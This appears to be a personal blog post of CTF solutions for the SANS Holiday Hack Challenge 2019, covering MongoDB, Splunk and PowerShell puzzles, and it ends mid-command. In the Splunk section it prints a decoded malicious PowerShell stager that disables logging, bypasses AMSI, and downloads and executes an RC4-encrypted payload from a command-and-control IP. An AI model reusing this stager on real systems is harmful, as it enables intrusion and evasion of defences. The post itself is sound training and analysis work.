---
title: "Some SANS Holiday Hack 2019 Solutions"
date: 2020-01-15T00:09:11-08:00
draft: false
toc: true
comments: true
categories:
- CTF
- Crypto
---

I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
year I participated for the first time. You can find the solutions below:

* [SANS Holiday Hack 2018 Solutions]({{< relref "/post/2019-01-15-sans-holiday-hack-2018/index.markdown" >}} "SANS Holiday Hack 2018 Solutions") 

<!--more-->

# Bushy Evergreen - Quit Ed
Answer: `q`.

# SugarPlum Mary - Linux Path
Answer: `/bin/ls`.

```
$ ls
This isn't the ls you're looking for
elf@772e4d3f58fc:~$ which ls
/usr/local/bin/ls
elf@772e4d3f58fc:~$ dir
Yes, you're very clever, but we REALLY want you to run ls!
elf@772e4d3f58fc:~$ /bin/ls
' '   rejected-elfu-logos.txt
Loading, please wait......
Hangup
elf@772e4d3f58fc:~$ 
```

Some funny stuff here:

```
elf@d1501a3e4ee2:~$ cat .elfscream.txt 
I'm trapped in an ASCII art factory - send help!

XXXXKKKKKKKKKKKKKKKKKKKKK00000000000000000000000000OOO
XXXKKKKKKKKKKKKKKKKKKK0000000000000000000000000000000O
XXKKKKKKKKKKKKKKKK00000000000000000OOOOOOOOOOOO0OOOOOO
XXKKKKKKKKKKKKK0000000OOOkkkkkkxxxxxxxxkkOOOOOOOOOOOOO
XKKKKKKKKKKK000OOkkxxxxxxxxxxkxddxxddddddodxkOOOOOOOOO
KKKKKKKKK00OkxxxxxxxxxxdxxxxddxxxdddxdddddddooxOOOOOOO
KKKKKKK0OkxxdxxkxxxxkxxxxxxdxxdddddxdddddooooooxOOOOOO
KKKKK0OkkkxxxxkkxxxxxxxxxddxxxxxxxxxddddddooooookOOOOO
NKK0OxxxxxxxxxxxxxxxxxxxxxxxxdxddddddddoooooooookOOOOO
NK0kxxxxkxxxxxxxxxxxxxxxxxxxddddddddoooooollooookOOOOO
KXOxdxxxxxdxxkxdoooollccccc::;:;;;,;,,,',,,,:llkkOOOOO
KKxddxxxddoccxdoloooodxxxxxxkxxxxxxxxkkxxxdoc,,okOOOOO
KKkddkxdxO:lkOOOOOOOOOOOOOOOkkkkxxdxxodoollll:'lkkOOOO
KKkxxxxk00d;;llllcllcc:::c:::;;;;;:::cccc:.  .;xkkOOOO
KKOkxkO000d,cododxddxxxkkkkOOOkkkkkkkkkxxo.   .:kkOOOO
KKkllok00x,,kOOOOOOdoodooxOOOOOOkxc:::ccdx;.  ..:kkOOO
KO;dOx:oOl,dOOO0Oklxc.oklxOOOOOklcd;.:xdcdd..   .okkOO
Kk;dkx:,xc,xOOO0Oxlddlc:dOOOOOOk:dxl:oo:cxx;.    ckkkO
KKk:;;:xOo,dOOO0OOkdooxOOOOOOOOkxc::::cdxxxl ..  'xkkO
KKKK00000k:;xOOOOOOOOOOOOOOk',okkkkkkkkkxxx:.....'xkkO
KKKKK0KK00d;:kOOOOOOOOOOOOk:  .;xkkkkkkkkxx..  .,xkkOO
KKKKK000000x::xOOOOOOOOOOOOdodxkkkkkkkkkkxx.  .'dkkOOO
KKKK00000000Od::okOOOOOOOkkxl,';cdkkkkkkxx: ..;xkkkOOO
KKKK000000000OOo,';xkOOkko'     .,dxxkkxxc...lkkkOOOOO
KKKK000000000OOOkl..dkkkx..  .   .lxxxxx;..'dkkkkOOOOO
KKK00000000000OOOOo.:kkkx.       .cxxxd'  ;xkkkkOOOOOO
KK0000000000000OOOk;'xkkk,       .cxxo...lkkkkkkOOOOOO
KK000000000000OOOOOk,okkko.      .odd'..dxkkkkkkkkkOOO
KK00000000000OOOOOOOo;xkkkc.     ;dd'..lxxkkkkkkkkkkkk
K00000000000OOOOOOOOkl:xkkko;'.,cdd'..:xxkkkkkkkkkkkkk
00000000000OOOOOOOOOOkc:xkkkxxxdoc.  .dxxkkkkkkkkkkkkk
0000000000OOOOOOOOOOOOko:oxxxdl'    .oxxkkkkkkkkkkkkkk
00000000OOOOOOOOOOOOOOkkxl;.     . .:xxkkkkkkkkkkkkkkk
00000OOOOOOOOOOOOOOOOOkkkkxo::'..':dxkkkkkkkkkkkkkkkkk
0000OOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
OOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
```

Other stuff here

```
elf@d1501a3e4ee2:~$ cat rejected-elfu-logos.txt 
        _        
       / \
       \_/
       / \
      /   \
     /    |
    /     |
   /       \
 _/_________|_
 (____________)

Get Elfed at ElfU!


  ()
  |\__/------\
  \__________/
  Walk a Mile in an elf's shoes
  Take a course at ElfU!


  ____\()/____
  |    ||    |
  |    ||    |
  |====||====|
  |    ||    |
  |    ||    |
  ------------
Be present in class
Fight, win, kick some grinch!
```

# Holy Evergreen - Mongo Pilfer
Answer `db.loadServerScripts();displaySolution();`.

Find the mongo DB location

```
elf@5503e3f7a93a:~$ ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.1  0.0  18508  3556 pts/0    Ss   03:50   0:00 /bin/bash
mongo        9  3.9  0.1 1014596 59016 ?       Sl   03:50   0:01 /usr/bin/mongod
     --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath=/tmp/mongo.log
elf         50  0.0  0.0  34400  2860 pts/0    R+   03:50   0:00 ps auxww
```

It's at `127.0.0.1:12121`.

```
elf@5503e3f7a93a:~$ mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
2019-12-12T03:52:39.277+0000 W NETWORK
[thread1] Failed to connect to 127.0.0.1:27017, in(checking socket for error after poll),
reason: Connection refused

2019-12-12T03:52:39.277+0000 E QUERY
[thread1] Error: couldn't connect to server 127.0.0.1:27017, connection attempt failed :
connect@src/mongo/shell/mongo.js:251:13
@(connect):1:6
exception: connect failed

Hmm... what if Mongo isn't running on the default port?

elf@5503e3f7a93a:~$ mongo --help

elf@5503e3f7a93a:~$ mongo --host 127.0.0.1 --port 12121
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:12121/
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
Server has startup warnings: 
[removed]
> db
test
> use test
switched to db test
> show collections
redherring
> db.redherring.find()
{ "_id" : "This is not the database you're looking for." }
> db.getCollectionInfos()
[
        {
                "name" : "redherring",
                "type" : "collection",
                "options" : {

                },
                "info" : {
                        "readOnly" : false,
                        "uuid" : UUID("dc357003-7f55-4ac9-a81e-d0f3f5080af3")
                },
                "idIndex" : {
                        "v" : 2,
                        "key" : {
                                "_id" : 1
                        },
                        "name" : "_id_",
                        "ns" : "test.redherring"
                }
        }
]
> 
```

Seems like it's not there. Let's look at the log path then. Nothing there either.

The hint points to this page

* https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases

```json
> db.adminCommand( { listDatabases: 1 } )
{
        "databases" : [
                {
                        "name" : "admin",
                        "sizeOnDisk" : 32768,
                        "empty" : false
                },
                {
                        "name" : "elfu",
                        "sizeOnDisk" : 262144,
                        "empty" : false
                },
                {
                        "name" : "local",
                        "sizeOnDisk" : 32768,
                        "empty" : false
                },
                {
                        "name" : "test",
                        "sizeOnDisk" : 32768,
                        "empty" : false
                }
        ],
        "totalSize" : 360448,
        "ok" : 1
}
```

Now let's try other databases.

```
> use admin
switched to db admin
> show collections
system.version
> db.collections.find()
> db.system.version.find()
{ "_id" : "featureCompatibilityVersion", "version" : "3.6" }
> use elfu
switched to db elfu
> show collections
bait
chum
line
metadata
solution
system.js
tackle
tincan
> db.bait.find()
{ "_id" : "Gait" }
> db.chum.find()
{ "_id" : "Yum!" }
> db.line.find()
{ "_id" : "Tensile strength" }
> db.metadata.find()
//
{ "_id" : ObjectId("5df1bbd7a97cf5b6aeb0c46c"), "index" : 0,
"value" : "#####hhc:{\"resourceId\": \"1cc6a846-84ff-459c-8282-9e7f6cd72028\",
\"hash\": \"49747f757af4819dfca11d3886cf439936daeb74c17f24bf9f29978271ede3b6\"}#####" }

> db.solution.find()
{ "_id" : "You did good! Just run the command between the stars:
    ** db.loadServerScripts();displaySolution(); **" }

> db.system.js.find()
{ "_id" : "displaySolution", "value" : {
    "code" : "function () { db.metadata.find().sort( { index: 1 }).forEach(function(v)
    { print(\"\\n\".repeat(100)); print(v.value); print(\"\\n\\n  Congratulations!!\\n\\n\");
    sleep(800); })}" } }

> db.tackle.find()
{ "_id" : "Mackerel?" }
> db.tincan.find()
{ "_id" : "SARDINES" }

> db.solution.find()
{ "_id" : "You did good! Just run the command between the stars:
    ** db.loadServerScripts();displaySolution(); **" }
```

# 6. Splunk
Answer: `Kent you are so unfair. And we were going to make you the king of the Winter Carnival.`

https://splunk.elfu.org/ with the username: `elf` / Password: `elfsocks`.

* What was the message for Kent that the adversary embedded in this attack?

1. What is the short host name of Professor Banas' computer?
    * `sweetums`
2. What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)
    * `C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt`
    * Search for `santa` and see what files are accessed.
    ```
    Message=CommandInvocation(Get-ChildItem): "Get-ChildItem"
    ParameterBinding(Get-ChildItem): name="Recurse"; value="True"
    ParameterBinding(Get-ChildItem): name="Path"; value="C:\Users\cbanas"
    ParameterBinding(Get-ChildItem): name="File"; value="True"
    CommandInvocation(ForEach-Object): "ForEach-Object"
    ParameterBinding(ForEach-Object): name="Process"; value="Select-String -path $_ -pattern Santa"
    ParameterBinding(ForEach-Object): name="InputObject"; value="Microsoft Edge.lnk"
    ParameterBinding(ForEach-Object): name="InputObject"; value="Naughty_and_Nice_2019_draft.txt"
    ParameterBinding(ForEach-Object): name="InputObject"; value="19th Century Holiday Cheer Assignment.doc"
    ParameterBinding(ForEach-Object): name="InputObject"; value="assignment.zip"
    ParameterBinding(ForEach-Object): name="InputObject"; value="Bing.url"
    ParameterBinding(ForEach-Object): name="InputObject"; value="Desktop.lnk"
    ParameterBinding(ForEach-Object): name="InputObject"; value="Downloads.lnk"
    ParameterBinding(ForEach-Object): name="InputObject"; value="winrt--{S-1-5-21-1217370868-2414566453-2573080502-1004}-.searchconnector-ms"
    ```
3. What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)
    * Searched for `144.202.46.214` (from the PowerShell thing) and found `144.202.46.214.vultr.com`
4. What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)
    * Search for `sourcetype=WinEventLog EventCode=4688`
    * Click on `Creator_Process_Name` in the left.
    * Click on `Rare Values`
    * See 14 values. We are looking for a document so we click on the `winword.exe` process and see its process ID.
    * Search for that process ID `index=main sourcetype=WinEventLog EventCode=4688 0x187c`
    * Find the event for the process that launched word and the command line has the document name. `19th Century Holiday Cheer Assignment.docm`
    ```
    "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n
    "C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm" /o ""
    ```
5. How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)
    * `index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | dedup results{}.workers.smtp.from`
    * Returns 22, but one is the professor's email. So answer is `21`.
6. What was the password for the zip archive that contained the suspicious file?
    * We have seen it, add `password` to the search.
    * It's an email from `bradly buttercups <bradly.buttercups@eifu.org>`
    ```
    Professor Banas, I have completed my assignment. Please open the attached
    zip file with password 123456789 and then open the word document to view it.
    You will have to click "Enable Editing" then "Enable Content" to see it.
    This was a fun assignment. I hope you like it!
    
    --Bradly Buttercups
    ```
    * `123456789`
    * Seems like he cheated because the professors was like
    ```
    Bradly, 

    I opened your assignment (which was not easy, by the way) and it seems you
    have not only not included an image per the instructions, but your
    assignment is identical to another student's assignment.  This means your
    grade will be 0/100.  

    -csb
    ```
7. What email address did the suspicious file come from?
    * `bradly.buttercups@eifu.org`

Actual message.

Query finds these two files

```
Buttercups_HOL404_assignment.zip
    /home/ubuntu/archive/9/b/b/3/d/9bb3d1b233ee039315fd36527e0b565e7d4b778f/Buttercups_HOL404_assignment.zip
19th Century Holiday Cheer Assignment.docm
    /home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af/19th Century Holiday Cheer Assignment.docm
```

The properties for the docm files is in `core.xml` but it's empty. Let's find the actual `core.xml` file from the list above.

```
core.xml    /home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4/core.xml
```

Inside that we have the thing.

`Kent you are so unfair. And we were going to make you the king of the Winter Carnival.`

The PowerShell base64 decoded

```powershell
IF ($PSVerSioNTaBLe.PSVERsIOn.MAJor  - gE 3)  {
    $GPF = [Ref].ASsEMBly.GETTyPE('System.Management.Automation.Utils')."GEtFiE`Ld"('cachedGroupPolicySettings', 'N' + 'onPublic,Static');
    IF ($GPF)  {
        $GPC = $GPF.GeTVAluE($nUlL);
        If ($GPC['ScriptB' + 'lockLogging'])  {
            $GPC['ScriptB' + 'lockLogging']['EnableScriptB' + 'lockLogging'] = 0;
            $GPC['ScriptB' + 'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }

        $val = [COLlEcTioNs.GEneRiC.DICTIoNAry[StrING, SySTEm.ObjecT]]::NeW();
        $vAl.AdD('EnableScriptB' + 'lockLogging', 0);
        $vaL.ADd('EnableScriptBlockInvocationLogging', 0);
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB' + 'lockLogging'] = $VAl
    } ElSE {
        [SCrIPTBlOCK]."GEtFIe`lD"('signatures', 'N' + 'onPublic,Static').SETVALUe($NUll, (NEW - OBjEct CollEcTions.GEnerIC.HashSeT[sTrING]))
    }

    [REf].ASSEMBlY.GETTYPe('System.Management.Automation.AmsiUtils')|? {
        $_
    }

    |% {
        $_.GETFielD('amsiInitFailed', 'NonPublic,Static').SEtValUe($NUlL, $True)
    };
};
[SySteM.NeT.SERvicEPoInTMaNaGer]::EXPecT100CONtInUe = 0;
$wc = NEw-ObjECT SysTEM.NeT.WeBCLiENT;
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$wC.HEADErS.ADd('User-Agent', $u);
$Wc.ProXy = [SySTeM.Net.WeBREQuEST]::DEFaULTWebProXy;
$WC.PRoXy.CREDenTIAls = [SySTEm.NET.CRedeNTiAlCAcHe]::DeFaulTNeTwORkCREDenTiALS;
$Script:Proxy = $wc.Proxy;
$K = [SySTEM.Text.EncOdING]::ASCII.GeTBYteS('zd!Pmw3J/qnuWoHX~=g.{>p,GE]:|#MR');
$R = {
    $D, $K = $ARGs;
    $S = 0..255;
    0..255|% {
        $J = ($J + $S[$_] + $K[$_%$K.COUnt])%256;
        $S[$_], $S[$J] = $S[$J], $S[$_]
    };
    $D|% {
        $I = ($I + 1)%256;
        $H = ($H + $S[$I])%256;
        $S[$I], $S[$H] = $S[$H], $S[$I];
        $_ -BXoR$S[($S[$I] + $S[$H])%256] # change it to -BXoR
    }

};
$ser = 'http://144.202.46.214:8080';
$t = '/admin/get.php';
$WC.HEADErs.Add("Cookie", "session=reT9XQAl0EMJnxukEZy/7MS70X4=");
$DATa = $WC.DownlOADDAtA($sEr + $T);
$Iv = $DatA[0..3];
$DatA = $dATa[4..$DatA.lENGtH];
 -JOIN[ChaR[]](& $R $DatA ($IV + $K))|IEX
```

# Xmas Cheer Laser - Sparkle Redberry
What is at `/home/callingcard.txt.`?

```
PS /home/elf> gc ../callingcard.txt
What's become of your dear laser?
Fa la la la la, la la la la
Seems you can't now seem to raise her!
Fa la la la la, la la la la
Could commands hold riddles in hist'ry?
Fa la la la la, la la la la
Nay! You'll ever suffer myst'ry!
Fa la la la la, la la la la
```

What is at `localhost:1225`?

```html
PS /home/elf> (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 08:10:51 GMT                                                       
Content-Length: 860                                                                       

<html>
<body>
<pre>
----------------------------------------------------
Christmas Cheer Laser Project Web API
----------------------------------------------------
Turn the laser on/off:
GET http://localhost:1225/api/on
GET http://localhost:1225/api/off

Check the current Mega-Jollies of laser output
GET http://localhost:1225/api/output

Change the lense refraction value (1.0 - 2.0):
GET http://localhost:1225/api/refraction?val=1.0

Change laser temperature in degrees Celsius:
GET http://localhost:1225/api/temperature?val=-10

Change the mirror angle value (0 - 359):
GET http://localhost:1225/api/angle?val=45.1

Change gaseous elements mixture:
POST http://localhost:1225/api/gas
POST BODY EXAMPLE (gas mixture percentages):
O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10
----------------------------------------------------
</pre>
</body>
</html>
```

We can turn it on:

```powershell
PS /home/elf> (Invoke-WebRequest -Uri http://localhost:1225/api/on).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 08:12:39 GMT                                                       
Content-Length: 32                                                                        

Christmas Cheer Laser Powered On
```

After that we can query the output and it seems like it's just random.

```powershell
(Invoke-WebRequest -Uri http://localhost:1225/api/gas -Method POST
    -Body "O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10").RawContent
```

`Could commands hold riddles in hist'ry?`? See PowerShell history?

```powershell
PS /home/elf> Get-History

  Id CommandLine
  -- -----------
   1 Get-Help -Name Get-Process 
   2 Get-Help -Name Get-* 
   3 Set-ExecutionPolicy Unrestricted 
   4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\services.htm 
   5 Get-Service | Export-CSV c:\service.csv 
   6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv 
   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
   8 Get-EventLog -Log "Application" 
   9 I have many name=value variables that I share to applications system wide. At a com…
```

But that does not show us everything, we are only looking for commands that do `Invoke`:

```powershell
PS /home/elf> Get-History | Where-Object {$_.CommandLine -like "*Invoke*"} 

  Id CommandLine
  -- -----------
   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
  11 (Invoke-WebRequest -Uri http://localhost:1225/api/on).RawContent
  12 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
  13 (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent
```

**`http://127.0.0.1:1225/api/angle?val=65.5`**

Did not work, let's leave, return and get everything.

```powershell
PS /home/elf> Get-History | Format-List -Property *

# removed

Id                 : 7
CommandLine        : (Invoke-WebRequest 
                     http://127.0.0.1:1225/api/angle?val=65.5).RawContent
ExecutionStatus    : Completed
StartExecutionTime : 11/29/19 4:56:44 PM
EndExecutionTime   : 11/29/19 4:56:44 PM
Duration           : 00:00:00.0310799

# removed

Id                 : 9
CommandLine        : I have many name=value variables that I share to applications 
                     system wide. At a command I will reveal my secrets once you Get my 
                     Child Items.
ExecutionStatus    : Completed
StartExecutionTime : 11/29/19 4:57:16 PM
EndExecutionTime   : 11/29/19 4:57:16 PM
Duration           : 00:00:00.6090308
```

Number 9 points to environmental variables.

```powershell
PS /home/elf> gci env:* | sort-object name

Name                           Value
----                           -----
_                              /root/CheerLaserService
DOTNET_SYSTEM_GLOBALIZATION_I… false
HOME                           /home/elf
HOSTNAME                       b011d5af8027
LANG                           en_US.UTF-8
LC_ALL                         en_US.UTF-8
LOGNAME                        elf
MAIL                           /var/mail/elf
PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bi…
PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/Mod…
PSModulePath                   /home/elf/.local/share/powershell/Modules:/root/.local/sh…
PWD                            /home/elf
RESOURCE_ID                    373f8b8e-9767-4f99-866c-6b7bbc879102
riddle                         Squeezed and compressed I am hidden away. Expand me from …
SHELL                          /home/elf/elf
SHLVL                          1
TERM                           xterm
USER                           elf
userdomain                     laserterminal
USERDOMAIN                     laserterminal
username                       elf
USERNAME                       elf
```

We need to expand the `riddle` variable:

```powershell
PS /home/elf> gci env:riddle | Format-list

Name  : riddle
Value : Squeezed and compressed I am hidden away. Expand me from my prison and I will 
        show you the way. Recurse through all /etc and Sort on my LastWriteTime to 
        reveal im the newest of all.
```

Apparently it's `archive`:

```powershell
PS /home/elf> gci -Path ../../etc/ -Recurse | sort LastWriteTime | select -last 1
gci : Access to the path '/etc/ssl/private' is denied.
At line:1 char:1
+ gci -Path ../../etc/ -Recurse | sort LastWriteTime | select -last 1 | ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : PermissionDenied: (/etc/ssl/private:String) [Get-ChildItem], UnauthorizedAccessException
+ FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

    Directory: /etc/apt

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          12/12/19  8:41 AM        5662902 archive
```

Let's see what kind of file it is. It looks too big to be a text file.

We can run `Get-Content -TotalCount n` on it to the get the first `n` lines.
Seems like it's a zip file.

```
PS /etc/apt> Expand-Archive -LiteralPath ./archive -DestinationPath /home/elf/
```

Now we have a directory named `refraction` inside `/home/elf`.

```
PS /home/elf/refraction> dir
    Directory: /home/elf/refraction

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------           11/7/19 11:57 AM            134 riddle
------           11/5/19  2:26 PM        5724384 runme.elf

PS /home/elf/refraction> gc ./riddle
Very shallow am I in the depths of your elf home. You can find my entity by
    using my md5 identity:

25520151A320B5B0D21561F92C8F6224
```

Googling for the MD5 finds nothing, might be the key for something inside `runme.elf`?

```
PS /home/elf/refraction> chmod +x ./runme.elf
PS /home/elf/refraction> ./runme.elf
refraction?val=1.867
```

Another part of the answer: **`refraction?val=1.867`**

Now to get the next step

```powershell
Get-ChildItem -recurse | Select-String -pattern "25520151A320B5B0D21561F92C8F6224"
    | group path | select name
```

Maybe we have to run Get-FileHash on the files inside `depth` (and not in
subdirectories) and see which one has what we want. Did not work, it might be in
one of the directories. Doing `Select-String` on the output did not work.

`Get-FileHash` returns an object and we can see its values.

```
PS /home/elf/depths> gci ./rujaagk0.txt | Get-FileHash -Algorithm MD5 | Get-Member

   TypeName: Microsoft.PowerShell.Commands.FileHashInfo
Name        MemberType Definition
----        ---------- ----------
Equals      Method     bool Equals(System.Object obj)
GetHashCode Method     int GetHashCode()
GetType     Method     type GetType()
ToString    Method     string ToString()
Algorithm   Property   string Algorithm {get;set;}
Hash        Property   string Hash {get;set;}
Path        Property   string Path {get;set;}
```

We can get specific fields with `Select-Object Path,Hash`.

```powershell
PS /home/elf/depths> gci -Recurse *.txt | Get-FileHash -Algorithm MD5 |
    Select-Object Path,Hash | Select-String -Pattern "25520151A320B5B0D21561F92C8F6224"

@{Path=/home/elf/depths/produce/thhy5hll.txt; Hash=25520151A320B5B0D21561F92C8F6224}

PS /home/elf/depths> gc ./produce/thhy5hll.txt
temperature?val=-33.5

I am one of many thousand similar txt's contained within the deepest of
/home/elf/depths. Finding me will give you the most strength but doing so
will require Piping all the FullName's to Sort Length.

PS /home/elf/depths> dir *.txt -Recurse | Select-String -Pattern "temperature\?val"

produce/thhy5hll.txt:1:temperature?val=-33.5
```

Another part of the answer: **`temperature?val=-33.5`**.

Not so lucky with `dir *.txt -Recurse | Select-String -Pattern "refraction\?val"`.

Does it mean we have get all file names, sort by length and see what happens? Yes.

```powershell
gc (gci *.txt -Recurse | sort { $_.FullName.length } | Select-Object -Last 1)

Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed:

bushy
alabaster
minty
holly

Do this for me and then you /shall/see .
```

It's the file below:

```
PS /home/elf/depths> gc
/home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown
/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever
/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful
/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to
/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
```

```
PS /home/elf> Get-Process -IncludeUserName

     WS(M)   CPU(s)      Id UserName                       ProcessName
     -----   ------      -- --------                       -----------
    108.68     2.27       7 root                           CheerLaserServi
    109.38     3.36      56 elf                            elf
      3.40     0.06       1 root                           init
      3.52     1.40       6 root                           Processes
     97.12     1.81      38 root                           pwsh
      0.74     0.00      10 alabaster                      sleep
      0.76     0.00      27 bushy                          sleep
      0.74     0.00      34 minty                          sleep
      0.82     0.00      37 holly                          sleep
      3.50     0.00      55 root                           su
      3.88     0.00       8 root                           sudo
      3.84     0.00      25 root                           sudo
      3.83     0.00      32 root                           sudo
      3.90     0.00      35 root                           sudo

PS /home/elf> Stop-Process -ID 30 -Force
PS /home/elf> Stop-Process -ID 10 -Force
PS /home/elf> Stop-Process -ID 53 -Force
PS /home/elf> Stop-Process -ID 72 -Force

/usr/bin/Processes: line 59:     8 Killed   /usr/bin/sudo -u alabaster /bin/bash -c "/bin/sleep 999999"
/usr/bin/Processes: line 59:    28 Killed   /usr/bin/sudo -u bushy /bin/bash -c "/bin/sleep 999999"
/usr/bin/Processes: line 59:    50 Killed   /usr/bin/sudo -u minty /bin/bash -c "/bin/sleep 999999"
/usr/bin/Processes: line 59:    69 Killed   /usr/bin/sudo -u holly /bin/bash -c "/bin/sleep 999999"
PS /home/elf> Get-Content /shall/see
Get the .xml children of /etc - an event log to be found. Group all .Id's and
the last thing will be in the Properties of the lonely unique event Id.
```

```
PS /etc> gci *.xml -Recurse
gci : Access to the path '/etc/ssl/private' is denied.
At line:1 char:1
+ gci *.xml -Recurse
+ ~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : PermissionDenied: (/etc/ssl/private:String) [Get-ChildItem], UnauthorizedAccessException
+ FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

    Directory: /etc/systemd/system/timers.target.wants

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          11/18/19  7:53 PM       10006962 EventLog.xml
```

Let's follow this:

* https://isc.sans.edu/forums/diary/Parsing+Windows+Eventlogs+in+Powershell/15298/

```
PS /> $mylog = Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml
PS /> $mylog | group Id                         

Count Name      Group
----- ----      -----
    1 1         {System.Diagnostics.Eventing.Reader.EventLogRecord}
   39 2         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
  179 3         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
    2 4         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
  905 5         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
   98 6         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
```

ID 1 is the one we are looking for.

```
PS /> $mylog | ? { $_.Id -match '1' }  

Message              : Process Create:
                       RuleName: 
                       UtcTime: 2019-11-07 17:59:56.525
                       ProcessGuid: {BA5C6BBB-5B9C-5DC4-0000-00107660A900}
                       ProcessId: 3664
                       Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                       FileVersion: 10.0.14393.206 (rs1_release.160915-0644)
                       Description: Windows PowerShell
                       Product: Microsoft® Windows® Operating System
                       Company: Microsoft Corporation
                       OriginalFileName: PowerShell.EXE
                       CommandLine: 
                       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c 
                       "`$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    
                       N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    
                       Rn=9`n}`n"
                       CurrentDirectory: C:\
                       User: ELFURESEARCH\allservices
                       LogonGuid: {BA5C6BBB-5B9C-5DC4-0000-0020F55CA900}
                       LogonId: 0xA95CF5
                       TerminalSessionId: 0
                       IntegrityLevel: High
                       Hashes: MD5=097CE5761C89434367598B34FE32893B
                       ParentProcessGuid: {BA5C6BBB-4C79-5DC4-0000-001029350100}
                       ParentProcessId: 1008
                       ParentImage: C:\Windows\System32\svchost.exe
                       ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Id                   : 1
Version              : 5
Qualifiers           : 
Level                : 4
Task                 : 1
Opcode               : 0
Keywords             : -9223372036854775808
RecordId             : 2422
ProviderName         : Microsoft-Windows-Sysmon
ProviderId           : 5770385f-c22a-43e0-bf4c-06f5698ffbd9
LogName              : Microsoft-Windows-Sysmon/Operational
ProcessId            : 1960
ThreadId             : 6640
MachineName          : elfuresearch
UserId               : S-1-5-18
TimeCreated          : 11/7/19 5:59:56 PM
ActivityId           : 
RelatedActivityId    : 
ContainerLog         : microsoft-windows-sysmon/operational
MatchedQueryIds      : {}
Bookmark             : System.Diagnostics.Eventing.Reader.EventBookmark
LevelDisplayName     : Information
OpcodeDisplayName    : Info
TaskDisplayName      : Process Create (rule: ProcessCreate)
KeywordsDisplayNames : {}
Properties           : {System.Diagnostics.Eventing.Reader.EventProperty, 
                       System.Diagnostics.Eventing.Reader.EventProperty, 
                       System.Diagnostics.Eventing.Reader.EventProperty, 
                       ddasdSystem.Diagnostics.Eventing.Reader.EventProperty…
```

```powershell
$mylog | ? { $_.Id -match '1' } | Format-List Properties | ForEach-Object {$_.ToString()}
Microsoft.PowerShell.Commands.Internal.Format.FormatStartData
Microsoft.PowerShell.Commands.Internal.Format.GroupStartData
